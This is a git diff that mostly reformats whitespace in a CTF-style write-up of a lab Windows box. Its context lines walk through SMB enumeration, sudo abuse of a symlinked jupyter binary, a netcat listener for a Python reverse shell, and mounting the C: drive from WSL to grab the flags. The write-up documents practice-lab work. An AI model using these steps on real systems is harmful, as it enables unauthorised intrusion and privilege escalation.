@@ -17,7 +17,7 @@ mermaid: true
 > - Open new Terminal on jupyter notebook  
 > - Privilege Escalation on jupyter console  
 > - Check linux enviroment(Docker/WSL)  
-> - Mount C: drive   
+> - Mount C: drive
 > - Got user.txt and root.txt  
 
 # Detail
@@ -41,10 +41,11 @@ PORT      STATE SERVICE       REASON  VERSION
 49669/tcp open  msrpc         syn-ack Microsoft Windows RPC
 49670/tcp open  msrpc         syn-ack Microsoft Windows RPC
 49671/tcp open  msrpc         syn-ack Microsoft Windows RPC
-```   
+```
 
 Port 139/445 opoen for SMB service.  
 Check SMB with `SMBClient`
+
 ```
 smbclient -L ////10.10.218.64              
 Password for [WORKGROUP\kali]:
@@ -59,10 +60,11 @@ Reconnecting with SMB1 for workgroup listing.
 do_connect: Connection to 10.10.218.64 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
 Unable to connect with SMB1 -- no workgroup available
 ```  
+
 We can access to `datasci-team`.  
 Enumeration in `datasci-team`, we found `jupyter-token.txt` that can access webpage in port `8888`  
 
-Open new `Terminal`   
+Open new `Terminal`
 Check some basic command on linux:  
 
 ```
@@ -79,14 +81,16 @@ User dev-datasci may run the following commands on DEV-DATASCI-JUP:
 (base) dev-datasci@DEV-DATASCI-JUP:~$ which jupyter
 /home/dev-datasci/anaconda3/bin/jupyter
 (base) dev-datasci@DEV-DATASCI-JUP:~$
-``` 
+```
 
 We can run `/home/dev-datasci/.local/bin/jupyter` with sudo without password.  
 But  
+
 ```
 (base) dev-datasci@DEV-DATASCI-JUP:~$ /home/dev-datasci/.local/bin/jupyter
 bash: /home/dev-datasci/.local/bin/jupyter: No such file or directory
-```   
+```
+
 Location `jupyter` is in `/home/dev-datasci/anaconda3/bin/jupyter`  
 So Create symbol link from `/home/dev-datasci/anaconda3/bin/jupyter` to `/home/dev-datasci/.local/bin/jupyter`
 
@@ -98,6 +102,7 @@ We in `jupyter console`.
 On Terminal, we listen on port 9001 and add python3 reverse shell on jupyter console.  
 
 We in  
+
 ```
 nc -nlvp 9001
 listening on [any] 9001 ...
@@ -107,6 +112,7 @@ root@DEV-DATASCI-JUP:/home/dev-datasci#
 ```  
 
 Can not find `root.txt` in `/root` ==> Maybe we are in docker or wsl
+
 ```
 root@DEV-DATASCI-JUP:/home/dev-datasci# cat /proc/1/cgroup | grep "docker\|lxc\|kube"
 cat /proc/1/cgroup | grep "docker\|lxc\|kube"
@@ -116,9 +122,11 @@ WSL
 root@DEV-DATASCI-JUP:/home/dev-datasci# 
 
 ```
+
 OK, we in WSL.
 
-Mount C: drive to /mnt/c   
+Mount C: drive to /mnt/c
+
 ```
 root@DEV-DATASCI-JUP:/home/dev-datasci# mount -t drvfs C: /mnt/c
 mount -t drvfs C: /mnt/c
@@ -146,4 +154,3 @@ root@DEV-DATASCI-JUP:/home/dev-datasci#
 ```
 
 ***We got both user.txt and root.txt in `/mnt/c`***
-
